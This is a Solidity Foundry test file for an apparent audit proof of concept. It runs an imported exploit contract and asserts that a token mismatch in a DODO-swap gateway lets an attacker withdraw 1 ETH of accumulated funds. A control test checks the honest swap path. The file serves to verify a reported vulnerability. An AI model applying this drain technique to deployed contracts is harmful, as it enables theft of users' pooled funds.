// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58578-h-1-missing-swap-withdrawal-validation-enables-accumulated-t.sol";

contract DodoSwapTargetMismatchTest is Test {
    function test_exploit_drainsAccumulatedEth() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 1 ether, "1 ETH stolen");
        assertEq(e.eth().balanceOf(address(e.attackerRecv())), 1 ether);
        assertEq(e.eth().balanceOf(address(e.gateway())), 999 ether);
        // Swap output (USDC) sits on gateway; ETH was withdrawn instead.
        assertEq(e.usdc().balanceOf(address(e.gateway())), 1 ether);
    }

    function test_control_matchingTokensStillWorks() public {
        Exploit e = new Exploit();
        // Matching toToken == targetZRC20: swap BTC→ETH and withdraw ETH (honest path).
        // Need ETH inventory on the swap router for the mix swap.
        e.eth().mint(address(e.swapRouter()), 10 ether);
        e.btc().mint(address(this), 1 ether);
        e.btc().approve(address(e.gateway()), 1 ether);
        uint256 before = e.eth().balanceOf(address(this));
        e.gateway().onCall(address(e.btc()), 1 ether, address(e.eth()), address(e.eth()), address(this));
        assertEq(e.eth().balanceOf(address(this)) - before, 1 ether, "honest path receives ETH from swap");
    }
}
